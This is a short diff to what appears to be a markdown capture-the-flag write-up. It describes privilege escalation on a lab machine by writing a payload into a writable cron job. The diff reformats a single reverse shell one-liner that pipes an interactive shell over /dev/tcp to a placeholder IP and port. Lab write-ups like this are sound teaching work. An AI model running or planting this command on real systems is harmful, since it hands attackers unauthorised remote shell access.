@@ -54,7 +54,7 @@ There appears to be a logrotate version 3.8.6, which may be vulnerable. If our a
 ![pos 4 image](../images/lion/pos4.webp)
 
 Going back to the cron job, since we have write permissions on the file, we can modify it and apply the payload. After making the changes, we just need to wait for the cron job to execute and gain privilege escalation.
+`/bin/bash -c 'sh -i >& /dev/tcp/ip/porta 0>&1'`
 <br>
-```/bin/bash -c 'sh -i >& /dev/tcp/ip/porta 0>&1'```
 ![pos 5 image](../images/lion/pos5.webp)
 ![pos 6 image](../images/lion/pos6.webp)
